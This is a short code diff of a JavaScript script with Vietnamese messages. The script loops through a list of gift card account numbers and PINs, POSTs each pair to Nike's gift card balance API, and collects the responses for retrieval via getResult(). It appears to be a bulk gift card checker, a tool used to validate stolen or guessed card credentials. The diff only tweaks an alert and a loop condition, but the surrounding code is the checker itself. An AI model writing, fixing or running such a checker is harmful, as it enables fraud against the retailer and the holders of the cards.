@@ -15,7 +15,7 @@ const getResult = () => {
 const check = () => {
   if(!raw[currentIndex]) {
     currentIndex = 0;
-    console.log('Xong, go getResult() de lay ket qua');
+    alert('Xong, go getResult() de lay ket qua');
     return;
   }
   const [accountNumber, pin] = raw[currentIndex];
@@ -29,7 +29,7 @@ const check = () => {
           erros.push([accountNumber, pin, this.response].join('|'));
         }
         currentIndex += 1;
-        currentIndex < raw.length && check();
+        check();
       }
   };
   xhttp.open('POST', 'https://api.nike.com/payment/giftcard_balance/v1/', true);
